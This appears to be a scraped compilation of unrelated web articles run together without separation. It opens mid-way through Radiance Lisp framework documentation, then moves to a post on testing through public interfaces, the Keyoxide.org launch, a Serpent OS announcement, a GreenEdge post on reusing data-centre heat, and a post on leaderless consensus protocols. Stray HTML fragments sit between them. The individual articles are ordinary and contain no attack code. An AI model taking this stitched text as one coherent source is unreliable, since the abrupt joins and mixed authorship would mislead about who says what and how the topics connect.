PATH    ::= .*</code></pre> <p>You can use <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code> to turn a URI into a concrete URL. Reversal, encoding, and proper formatting of all the parts is handled for you automatically there.</p> <p>See <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAINS">domains</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APORT">port</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APATH">path</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AMATCHER">matcher</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-STRING">uri-string</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMAKE-URI">make-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMAKE-URL">make-url</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AENSURE-URI">ensure-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOPY-URI">copy-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APARSE-URI">parse-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3C">uri&lt;</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3E">uri&gt;</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI%3D">uri=</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-MATCHES">uri-matches</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AMERGE-URIS">merge-uris</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREPRESENT-URI">represent-uri</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code>.</p> <h3 id="1.2_request_and_response">1.2 Request and Response</h3> <p>In order to encapsulate the data that is sent to  and from, we have the idea of a Request (<code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>) and Response (<code><a href="#CLASS%20RADIANCE-CORE%3ARESPONSE">response</a></code>) object. The Request object holds the URI that represents to which location the request goes, and all the data contained in the HTTP payload like post, get, header, and cookie variables. The Response object holds the return-code, headers, cookies, and the actual body data.</p> <p>During the processing of a request, these two objects must always be present and bound to the <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2AREQUEST%2A">*request*</a></code> and <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a></code> variables. They encapsulate a lot of very vital information that is necessary to generate dynamic pages. Additionally, the Request contains an opaque <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code> table in which you can store arbitrary data. This is useful when you need to exchange pieces of information between individual parts of the system that may be reached during the request execution.</p> <p>Requests don't necessarily have to come from the HTTP server. In order to test things you can also construct a request yourself and send it out programmatically. Whatever the case, the primary interface to dispatch a request is called <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>. This will construct a Request and Response object for you and appropriately handle the URI. If you want to do that yourself and <em>really</em> just send out a complete Request object, you can use <code><a href="#FUNCTION%20RADIANCE-CORE%3AEXECUTE-REQUEST">execute-request</a></code>.</p> <p>For the actual handling of a request, see dispatchers, pages, and API endpoints.</p> <p>See <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2AREQUEST%2A">*request*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEFAULT-EXTERNAL-FORMAT%2A">*default-external-format*</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEFAULT-CONTENT-TYPE%2A">*default-content-type*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHTTP-METHOD">http-method</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHEADERS">headers</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APOST-DATA">post-data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AGET-DATA">get-data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACOOKIES">cookies</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AUSER-AGENT">user-agent</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREFERER">referer</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAIN">domain</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AREMOTE">remote</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AISSUE-TIME">issue-time</a></code>, <code><a href="#CLASS%20RADIANCE-CORE%3ARESPONSE">response</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADATA">data</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ARETURN-CODE">return-code</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACONTENT-TYPE">content-type</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AEXTERNAL-FORMAT">external-format</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHEADERS">headers</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ACOOKIES">cookies</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE">cookie</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ANAME">name</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AVALUE">value</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAIN">domain</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3APATH">path</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AEXPIRES">expires</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AHTTP-ONLY">http-only</a></code>, <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ASECURE">secure</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE-HEADER">cookie-header</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ACOOKIE">cookie</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AGET-VAR">get-var</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APOST-VAR">post-var</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3APOST%2FGET">post/get</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AHEADER">header</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AFILE">file</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREDIRECT">redirect</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ASERVE-FILE">serve-file</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST-RUN-TIME">request-run-time</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEBUGGER%2A">*debugger*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AHANDLE-CONDITION">handle-condition</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ARENDER-ERROR-PAGE">render-error-page</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AEXECUTE-REQUEST">execute-request</a></code>, <code>set-data</code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code></p> <h3 id="1.3_route">1.3 Route</h3> <p>Before a Request can be dispatched on, it goes through something called the routing system. Unlike in other frameworks, where 'routes' designate what handles a request, in Radiance a Route (<code><a href="#FUNCTION%20RADIANCE-CORE%3AROUTE">route</a></code>) is a form of URI translator. This part of the system is what's responsible for creating and upholding two "universes", an internal and an external one.</p> <p>The internal universe is the one actual web applications live in. The external universe is the one the HTTP server and a user of the website lives in. This distinction is necessary in order to allow you to, one one hand, write web applications without having to worry about what a potential setup on a server might look like at some point. You don't have to worry about what kind of domain, port, path setup may be necessary to run your application. On the other hand, it allows you, as a webadmin, to customise and run the system to your exact desires without fear of breaking things.</p> <p>This all is facilitated by routes, of which there are two kinds: mapping, and reversal routes. Mapping routes are responsible for turning a URI from the external universe into one of the internal universe. Usually this involves cutting away the top-level domain and perhaps doing a mapping of subdomains. Reversal routes do the opposite-- they go from the internal universe to the external. This is necessary in order to make links in your served pages refer to …</p></section></article></div>

						Only Test Through Public Interfaces

<p>One of the most commonly asked questions in developer communities regarding Test-Driven Development and unit testing is 
whether one should write unit tests for private methods, and if so, how to accomplish this. The answer to this question 
is quite simply:</p>

<blockquote>
  <p>“Of course. As many lines of code as possible should be covered by unit tests”.</p>
</blockquote>

<p>However, the way we accomplish this is very important.</p>

<p>The behaviour of a class or module should only be tested through its public members. So if we’ve followed the steps 
of “Red, Green, Refactor”, every line of code that is used by the public methods of a class or module has been exercised. 
Whenever a private method is not directly or indirectly used by these public methods, then it’s probably no longer 
needed. A private method that is not being used can therefore be removed. There’s no need to keep dead code around. It 
only confuses other developers of the team later on. Besides, that’s why we make use of version control systems.</p>

<p>
    <img src="https://principal-it.eu/assets/img/posts/only-test-public-interfaces-01.png" alt="Testing private methods through their public counterparts" width="750">
</p>

<p>When we only test through public methods, we also guarantee to exercise the code of the private methods that are being 
used. Private methods should be considered as an implementation detail. So there is no reason to directly try to put 
them under test.</p>

<p>However, there might be some cases where we just want to write unit tests for a private method. The first and best 
approach is to simply turn this private method into a public method instead. If this bothers us, we have to question 
ourselves why that is. This usually means that our class or module has too many responsibilities and that we should 
refactor this particular part of the code anyway. One way might be to move the private method in question as a public 
method of a new class.</p>

</p>

<p>A good design implies that the code is easy to test. When it’s not easy to test, then the design of the system is not 
that very good to begin with. This is why some developers refer to the expression 
<a href="https://principal-it.eu/2018/11/listening-to-the-vital-signs-of-tdd/">“listening to the tests”</a>. Unit tests very quickly amplify when 
something is not right with the design of the system.</p>

<p>Some programming languages or platforms enable developers to use reflection, or some kind of meta-programming, in order 
to reach and execute private methods at runtime. I would strongly advice against using such techniques for unit tests.</p>

<p>Nonetheless, this might come in handy when refactoring a very nasty, legacy code base. In that case, we can sparingly 
use such an approach to enable us to make some progress in our refactoring endeavours. However, we don’t want to keep 
these kinds of tests around for very long. Unit tests that employ reflection or meta-programming are too tightly coupled 
to the implementation of the Subject Under Test. At some point, we want to end up with a nice and clean public interface
that is easy to test and for which implementation can be easily changed as well. So make sure to remove unit tests
that make use of reflection or meta-programming as soon as possible.</p>

<br/>
July 1, 2020 | https://yarmo.eu/post/keyoxide | <a href="https://web.archive.org/web/*/https://yarmo.eu/post/keyoxide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, I'm excited to launch <a href="https://keyoxide.org/">Keyoxide.org</a>, the lightweight and FOSS solution to make basic cryptography operations accessible to regular humans.</p>
<h2>What is Keyoxide.org?</h2>
<p><a href="https://keyoxide.org/">Keyoxide.org</a> offers easy encryption, signature verification and decentralized identity proof verification based on PGP keys while demanding little in-depth knowledge about the underlying encryption program from its users.</p>
<p>This project aims to offer comparable functionality as services like <a href="https://keybase.io/">Keybase</a> while reducing friction and being more open.</p>
<p>The project is MIT licensed, uses <a href="https://github.com/openpgpjs/openpgpjs">openpgpjs</a> and is hosted on <a href="https://codeberg.org/yarmo/keyoxide">Codeberg</a>.</p>
<h2>Why only encryption and signature verification?</h2>
<p>These are the operations that are available when only having access to public keys instead of private keys. If you wish to decrypt messages and sign them, you need a keypair. If you have a keypair, you probably have the knowledge to use dedicated tools like the CLI or Kleopatra. And if you do, you probably won't be using <a href="https://keyoxide.org/">Keyoxide.org</a> directly yourself.</p>
<p>Indeed, if you possess a PGP keypair, <a href="https://keyoxide.org/">Keyoxide.org</a> is the tool you send to others to interact with your public key more easily. Allow them to encrypt a message for you, to verify one of your signatures, to verify your online identities using decentralized proofs.</p>
<h2>What are those decentralized identity proofs you keep mentioning?</h2>
<p>You know how Keybase allows you to prove you have control over accounts on certain websites and services? A great function! Fortunately for you, this function can be even better and more secure by using <a href="https://keyoxide.org/guides/openpgp-proofs">decentralized OpenPGP identity proofs</a>. <a href="https://keyoxide.org/">Keyoxide.org</a> will prove your identity on multiple platforms at the same time and yet, you are not required to make an account to use this function. How is that possible?</p>
<p>Well, it's called <em>decentralized</em> for a reason: <a href="https://keyoxide.org/">Keyoxide.org</a> doesn't hold your proofs, your key does! Any software that can access your public key can verify these proofs for anyone. When better tooling comes around, you could verify those proofs using a mobile app, using a command-line utility, you name it. No single service holds your proof, only you do, stored inside your keypair.</p>
<p>I have written a <a href="https://keyoxide.org/guides">guide</a> on how to add a proof for every platform currently supported by this website: <a href="https://keyoxide.org/guides/dns">domains</a>, <a href="https://keyoxide.org/guides/lobsters">Lobste.rs</a>, <a href="https://keyoxide.org/guides/twitter">Twitter</a>, <a href="https://keyoxide.org/guides/github">Github</a>, a <a href="https://keyoxide.org/guides">bunch more</a> and work is in progress to support even more still. Is your beloved service not in the list? <a href="https://codeberg.org/yarmo/keyoxide">Open an issue or make a PR</a>! Free open-source software FTW!</p>
<p>Oh, that reminds me, any <a href="https://keyoxide.org/guides/mastodon">Mastodon</a> instance can be used to prove your identity. Yes, <a href="https://github.com/keybase/keybase-issues/issues/3385">any</a>.</p>
<h2>So how does it compare to Keybase?</h2>
<p>There's a more complete <a href="https://keyoxide.org/guides/feature-comparison-keybase">guide on the Keyoxide website</a>, but in a nutshell:</p>
<ul>
<li>more privacy-friendly by not forcing you to create an account and handing over data</li>
<li>more secure by not asking you to trust the service with your private keys</li>
<li>open-source servers (<a href="https://github.com/keybase/client/issues/24105">a must</a>)</li>
<li>encrypt/verify with every public key accessible on the internet, not just those that have been uploaded to a proprietary server</li>
<li>almost all processing is done in the browser, no data is sent to servers*</li>
<li>no vendor lock-in</li>
<li>selfhostable</li>
</ul>
<p>* Only exception is decentralized identity proof verification: some service providers do not have the correct CORS headers (like Reddit) or require APIs (like Twitter). In these rare cases, simple PHP scripts (also open-source) run the proof verification instead.</p>
<h2>Can I get an account?</h2>
<p>No. <a href="https://keyoxide.org/">Keyoxide.org</a> doesn't need your data on its servers. There are already several ways of exposing public keys on the internet, including <a href="https://keyoxide.org/guides/web-key-directory">web key directory</a> (WKD) and dedicated servers like <a href="https://keys.openpgp.org/">keys.openpgp.org</a>. Let's use those instead of making yet another service where you need to upload your keys to.</p>
<h2>Can I get a profile page then?</h2>
<p>Yes! Append your PGP fingerprint or WKD id to the URL and there it is!</p>
<p>Want an example? Here's  my profile at<br>
<a href="https://keyoxide.org/9f0048ac0b23301e1f77e994909f6bd6f80f485d">https://keyoxide.org/9f0048ac0b23301e1f77e994909f6bd6f80f485d</a>.</p>
<p>Now you know what accounts on various services are mine, where to follow me if you wish to get updates on the project and if you wish to send me an encrypted message, that's also just two clicks away.</p>
<h2>What about my private keys?</h2>
<p>Don't upload your private keys to the internet, period. If a service wants your private keys on their (proprietary) servers, say no.</p>
<h2>You said selfhostable?</h2>
<p>Well, yes! It's not a fully supported use case just yet, but the browser does all the processing, the server is mostly just there to deliver the files to the user to perform the operations. <a href="https://codeberg.org/yarmo/keyoxide">Grab the code</a> and put it on your own PHP server!</p>
<h2>Any closing words?</h2>
<p>I built this to provide better tooling around modern-day encryption programs and reduce the friction for less tech-savvy people when interacting with public keys.</p>
<p>For those who wish to use encryption programs beyond OpenPGP, <a href="https://codeberg.org/yarmo/keyoxide/issues">let's talk about this</a>. Keyoxide doesn't have any reference to PGP in its name for a reason: it could serve as a platform for easy interaction with any public key, no matter the underlying encryption program.</p>
<p>And above all, I hope you see the same benefit and potential in <a href="https://keyoxide.org/">Keyoxide.org</a> as I do and would like to see it grow as an open and accessible platform to push forward the democratization of online privacy and security.</p>
<p>Privacy is not a luxury.</p>
<p>Many thanks to <a href="https://metacode.biz/@wiktor">Wiktor</a> for helping with the decentralized identity proofs.</p></div></div>]]>

    <div>
        <article>
            <p>Serpent OS is (or at least, will be) a Linux distribution with notably different goals
from the mainstream offering. We’re in the process of establishing the project, with
development properly starting towards the end of July.</p>
<h4 id="naming">Naming</h4>
<p>Eventually our plan is to rebrand as ‘Serpent Linux*’ - however we will first need to
complete some early donkey work and apply for a sublicense to use the name. As explained
below, this is <em>not</em> Serpent ‘GNU/Linux’ as the distribution will not be dependent on
a GNU toolchain or runtime. For those who are curious, we’re working with an artist to
choose an appropriate logo for the project.</p>
<h4 id="aims">Aims</h4>
<p>The vast majority of Linux distributions have highly similar goals, and can be best
described using these common industry buzzwords:</p>
<pre><code>Modern, lightweight, privacy oriented/respecting, user-friendly desktop
</code></pre>
<p>We’re focused on building a Linux distribution that serves our own needs.
Chiefly, a Linux distribution for people who want to use Linux, not a “Linux-based-OS”
focusing on interoptability with macOS* + Windows*.</p>
<p>In a nut shell, this is <strong>not</strong> “Linux for the masses”. This is a project setting out to
use Linux as Linux should be used. This will in turn help us to build a significantly
advanced Linux distribution that is both modular and optimised for modern machines.</p>
<h4 id="a-truly-modern-linux-distribution">A Truly Modern Linux Distribution</h4>
<p>As we’re taking a distro-first, compatibility-later approach, our design decisions
will allow us to take some bold steps. We’ll also be able to incorporate all of the
more sensible design improvements in Linux distribution design over the last decade or
so:</p>
<ul>
<li>No more usrbin split</li>
<li>100% clang-built throughout (including kernel)</li>
<li>musl as libc, relying on compiler optimisations instead of inline asm</li>
<li><code>libc++</code> instead of <code>libstdc++</code></li>
<li>LLVM’s binutils variants (<code>lld</code>, <code>as</code>, etc.)</li>
<li>Mixed source/binary distribution</li>
<li>Moving away from <code>x86_64-generic</code> baseline to newer CPUs, including Intel and AMD specific optimisations</li>
<li>Capability based subscriptions in package manager (Hardware/ user choice / etc)</li>
<li><code>UEFI</code> only. No more legacy boot.</li>
<li>Completely open source, down to the bootstrap / rebuild scripts</li>
<li>Seriously optimised for serious workloads.</li>
<li>Third party applications reliant on containers only. No compat-hacks</li>
<li>Wayland-only. X11 compatibility via containers will be investigated</li>
<li>Fully stateless with management tools and upstreaming of patches</li>
<li>Lots, lots more. We’ll blog about it.</li>
</ul>
<h4 id="opinionated-by-default">Opinionated By Default</h4>
<p>A recurring theme that holds back the development of world-class Linux, is high tolerance
for those holding Linux back. A perfect example is NVIDIA* and their lack of support for
accelerated Wayland support on their GPUs. Consequently, our project won’t tolerate such
decisions and will instead blacklist the NVIDIA proprietary drivers from the distribution.</p>
<p>There are other examples that will emerge over time, and will become quite clear.</p>
<p>The time for Linux distributions giving in, with thousands of man hours wasted working around
negative actors, had come to an end.</p>

<p>We will only accept community involvement via our IRC channel: <code>#serpentOS</code> on Freenode.
We will not operate a public bug tracker or forums. Once we are past out initial bootstrap
phase we will set up an email address to help reporting security issues to the team, and
we will of course release security notices.</p>
<p>In terms of feature requests, these will be largely at the discretion of core contributors.
When a company has been formed to house this project, we’re happy to hash out an SLA for
required works.</p>
<h4 id="timescale">Timescale</h4>
<p>It may seem incredibly odd launching a website before there is a distro to show off, however,
it became very apparent that the cat would be out of the bag, so we wanted to be prepared.</p>
<p>Currently, the Founder is in the midst of relocating to the Republic of Ireland. Once complete
we’ll move to stage2 of our bootstrap process and begin working on the tooling needed for the
base development.</p>

<p>Especially in these Corona days, we are all quite happy that we can do everything online. It’s all been doable by a global shift to create online services for everything, which we happily call The Cloud.&nbsp;</p>



<p>What often goes unnoticed, is that these services run on <em>real</em> computers, take up <em>real</em> space, and use <em>real</em> energy. Lots of energy. All of this energy is turned into heat, which is disposed of and typically means using additional energy to cool off all of the servers. At the same time, elsewhere on the grid, we use primary energy to generate heat for our house, our shower, the office, a pool, the gym, and everything else.&nbsp;</p>



<figure><img src="https://www.greenedge.cloud/wp-content/uploads/2020/06/424c9822-8a08-4286-93ad-c13e7c30d4d2.jpeg" alt="Chimney dirty smoke" srcset="https://www.greenedge.cloud/wp-content/uploads/2020/06/424c9822-8a08-4286-93ad-c13e7c30d4d2.jpeg 622w, https://www.greenedge.cloud/wp-content/uploads/2020/06/424c9822-8a08-4286-93ad-c13e7c30d4d2-300x200.jpeg 300w" sizes="(max-width: 622px) 100vw, 622px"><figcaption>Image of dirty chimney.

<p>Simply put: the cloud is built on data centers and data centers have a massive carbon footprint. We need a sustainable alternative. I’m one of four guys on a journey in which we feel we can build a great company, protect the environment, and have fun doing it by providing that alternative.</p>



<p>At GreenEdge we’re building a distributed cloud platform, housed at locations where the excess heat the servers produce is reused immediately. This allows us to use energy up to 90% more efficiently than regular cloud providers and offer a truly green option.</p>



<h2><strong>The problems we’re trying to solve&nbsp;</strong></h2>



<p><strong>Wasting Energy</strong></p>



<p>Data centers account for roughly 1% of all electricity used globally. The Dutch Datacenter Association says it’s closer to 3% in the Netherlands. To put that into perspective: 3% is almost as much electricity as the entire city of Amsterdam uses, except for the 10% used by data centers themselves.</p>



<p>And it’s growing. In fact, compute usage is growing exponentially. Over the past few years, two factors have managed to delay this translating into a spike in energy usage. First, moving compute in data centers to multi-tenant cloud providers, which allows for more efficient usage of the available computers and cooling. And second, chips were getting exponentially more efficient.</p>



<p>These methods have run their course. Most services already run in the cloud and both AMD and Intel now use increasingly more power. Data center energy usage is set to rise sharply, what’s needed are innovations in power-saving.</p>



<p><strong>Having a Green Option</strong></p>



<p>Many of us now try to buy the energy-saving lamp, rent the electric car, and favor the store where they use less packaging. In other words: we choose products with a smaller footprint and we influence our vendors to do the same.</p>



<p>But when it comes to services online you’ll notice there isn’t much to choose from. No online service claims to be more environmentally friendly than the other. Why is that? It makes sense once you understand that the online services rely on data centers or cloud infrastructure providers, who in turn offer virtually no green options. Many may buy green energy, and there is some improvement in increased cooling efficiency and higher per-machine utilization, but this is largely invisible to the service providers, resulting in the lack of a green alternative available to cloud customers.</p>



<h2><strong>Solving both these problems at once</strong></h2>



<p>🤔. What if we move these servers to places where the heat can be re-used? 🌱  And what if we connect all the servers together using fiber-optic networks, to form one big and distributed infrastructure 🕸. Can we then offer capacity on this infrastructure to anyone interested in having a truly green option?</p>



<p>That’s exactly what we’re doing! Consider the following diagram:</p>



<figure><img src="https://www.greenedge.cloud/wp-content/uploads/2020/06/two-sided-business-1-1024x273.png" alt="" srcset="https://www.greenedge.cloud/wp-content/uploads/2020/06/two-sided-business-1-1024x273.png 1024w, https://www.greenedge.cloud/wp-content/uploads/2020/06/two-sided-business-1-300x80.png 300w, https://www.greenedge.cloud/wp-content/uploads/2020/06/two-sided-business-1-768x204.png 768w, https://www.greenedge.cloud/wp-content/uploads/2020/06/two-sided-business-1.png 1078w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>On the left side of our business, we offer a green, sustainable cloud infrastructure as a service. Customers can run generic workloads for web application hosting, big data &amp; analytics, machine learning, etc. details of which you can find on<a href="https://www.greenedge.cloud/"> our site</a>.</p>



<p>On the right side of our business, we offer places free heating, produced on-site. We select locations where a large percentage of our energy can be used to substitute other primary energy sources and essentially do a simple trade. We get to use their physical space, they get a lower energy bill.</p>



<p>At our partner locations, we install our servers, which we hook up to our own network. All these edge sites together then make up our infrastructure.</p>



<figure><img src="https://www.greenedge.cloud/wp-content/uploads/2020/02/Distributed-Cloud-Multi.png" alt="GreenEdge Distributed Datacenter" srcset="https://www.greenedge.cloud/wp-content/uploads/2020/02/Distributed-Cloud-Multi.png 1012w, https://www.greenedge.cloud/wp-content/uploads/2020/02/Distributed-Cloud-Multi-300x125.png 300w, https://www.greenedge.cloud/wp-content/uploads/2020/02/Distributed-Cloud-Multi-768x319.png 768w" sizes="(max-width: 1012px) 100vw, 1012px"><figcaption>Distributed Cloud Architecture</figcaption></figure>



<h2><strong>Why now?</strong></h2>



<p><strong>The cloud market is ready for this</strong></p>



<p>In 2013 when I worked at Docker as the project started, web application infrastructure meant starting virtual machines and maintaining them as if they were physical computers. Docker changed all that and revolutionized the way (almost) every company now manages its applications. I should also mention Kubernetes, which is a huge and very popular open-source project. It was initially made possible in large part because of the success of Docker but has since grown to be much bigger and broader. It now brings a whole ecosystem of tools along and has created an universal interface which is compatible between different cloud providers.&nbsp;</p>



<p>The broad support by cloud providers, and rapidly growing adoption of Kubernetes means customers can now more easily switch between cloud providers, and develop systems where different parts of their application run on different providers’ infrastructure.</p>



<p>For GreenEdge this is a huge benefit. We are small and the hyperscalers so large that we should be comfortable with customers utilizing both. That’s why we also support Multi-Cloud, where customers run workloads at several clouds at the same time and Hybrid-Cloud, where customers run work on-site and in the cloud.</p>



<p><strong>The Netherlands is watching its waste</strong></p>



<p>Throughout society, we see a growing awareness of the upcoming climate problem, and the pressing need to reduce, re-use, and recycle. Amsterdam has called for a stop in the building of new data centers, and the municipality has set itself the ambitious goal to no longer use natural gas for heating by 2040. — It <em>needs</em> alternative sources of heat.</p>



<h2><strong>Call to Action</strong></h2>



<p>The problems we are trying to solve are complex and our plan is unique. We would like to invite you to join in, and help us meet our goals. One of the best ways is to start by reaching out and start a conversation. </p>

            <p><span>Abstract.</span> Papers on leaderless consensus protocols such as EPaxos and Atlas describe the protocols from the ground up. This approach helps a reader without prior knowledge to understand how they work, but at the same time it makes it hard for an expert to grok them because they need to trace and check all the assumptions from scratch rather than rely on already proved protocols. This may explain why the leaderless consensus protocols didn't get traction in the industry despite being known since 2013.</p>

            <p>In this post I present a leaderless consensus protocol built in a modular way on top of known consensus protocol. Its modularity helps in understanding and retrofitting into existing solutions.</p>

            <p>From an engineering perspective a consensus protocol is a replication protocol. Usually it is used to replicate a state of an application (a state machine) to increase its availability. The key difference between consensus and primary-backup replication is an ability to tolerate node and network failures without losing integrity of the data.</p>

            <p>One may think of consensus replication as a strongly consistent variant of master-master replication where any replica (a proposer) can initiate a change. Althrouth consistency is never compromised in practice the concurrent processes may abort each other and stall the performance. In literature this situation is known as dueling proposers.</p>

            <blockquote>"It’s easy to construct a scenario in which two proposers each keep issuing a sequence of proposals with increasing numbers, none of which are ever chosen", Paxos Made Simple</blockquote>

            <blockquote>"The presence of two concurrent leaders can prevent the commitment of any consensus decision and hence prevent progress", Deconstructing Paxos</blockquote>

            <blockquote>"if multiple processes detect that there is no leaser and all attempt to become leader an the same time, then none of the process is likely to succeed (again dueling proposers)", Google SRE book</blockquote>

            <p>The can't be dismissed as a fluke, take latency of CASPaxos when all requests to change the <span>same object</span> land the same replica and latency of CASPaxos when the requests are uniformly distributed across all five replicas.</p>

            <p><img src="http://rystsov.info/images/pacified/dueling.png"></p><p>We see that when there are 20 clients then the dueling reduces throughput 2.85 times from 4513 ops/s to 1581 op/s and increases p99 latency 10.37 times from 4467 microseconds to 46 milliseconds.</p>

            <p>The absolute numbers and the degradation ratio depend on the hardware. For this and all the follow up experiments I simulated <code>5+c</code> nodes cluster (where <code>c</code> is the number of the clients) with around 178 us RTT between any nodes, 655 bytes/us network throughput, 2 ms fsync disk latency and 1132 bytes/us disk throughput, although I haven't pushed the system to the limit of the bandwidth so the throughput numbers for disk and network don't really matter.</p>

            <p>The shape of the charts surprised me. Usually when a system reaches saturation the latency looks linear while throughput reaches plateau and stops growing. But in this case the shapes are inverted which implies that the system is far from saturation and that we can keep adding clients increasing throughput without affecting latency. It happens because CASPaxos replicates state instead of the commands so a proposer can apply multiple commands in chain to the stored state and replicate only the final version (batching on steroids) reducing the load on the network.</p>

            <p>Leslie Lamport suggested using a leader election abstraction to select a leader (a distinguished proposer) which is the only one capable of processing requests. It's worth noting that the idea of a leader is used to reduce contention and not to enforce consistency. Meaning the leader election may be weak and may not prevent the case where several replicas become leaders for the same period of time. It allows the use of a large class of protocols for leader election including randomised timeouts &amp; heartbeats, consistent hashing routering or external arbiter.</p>

            <p>But the idea of leader election has its flaws:</p>

            <ul>
                <li>hardware issues may degrade performance of a leader and affect the whole system</li>
                <li>after a leader fails and until a new leader is elected, a consensus based system becomes unavailable</li>
                <li>randomised leader election under unstable network creates non-trivial failure modes which may delay election of a new leader</li>
            </ul>

            <p>I built a leadered version of consensus replication and used fault injection to demonstrate the issues. The stable leadership is compared with ad hoc leadership which is known to suffer from dueling proposers under normal circumstances. The leaderd system uses 4ms election timeout while the fault injector isolates a random replica for 12ms.</p>

            <p><img src="http://rystsov.info/images/pacified/leader.adhoc.unrest.png"></p><p>For 20 clients the fault injections cause the stable leadership to have 2.46 times lower throughput (709 ops/s vs. 1750 ops/s) and 1.5 times higher p99 latency (60ms vs. 40ms) than an ad hoc leadership approach.</p>

            <p>It looks like we have to choose between scylla and charybdis: either to have 6.36 times lower than optimal throughput (4513 ops/s vs 709 ops/s) during unavoidable transient issues under strong leadership or to have throughput profile independent of failures (1581 ops/s and 1750 ops/s) but both 2.85 times less than optimal under ad hoc leadership.</p>

            <p>The question is if there is a compromise between being fast without failures and being fast on a rainy day. The family of leaderless consensus protocols fills that niche.</p>

            <p><img src="http://rystsov.info/images/pacified/epaxos.png"></p><p>EPaxos solves the contention problem and provides excellent fault tolerance. But despite being around for seven years it hasn't generated enough traction and I don't know any product in the industry which is using it. The lack of interest is especially noticeable if we compare EPaxos to Raft protocol which was discovered around the same time.</p>

            

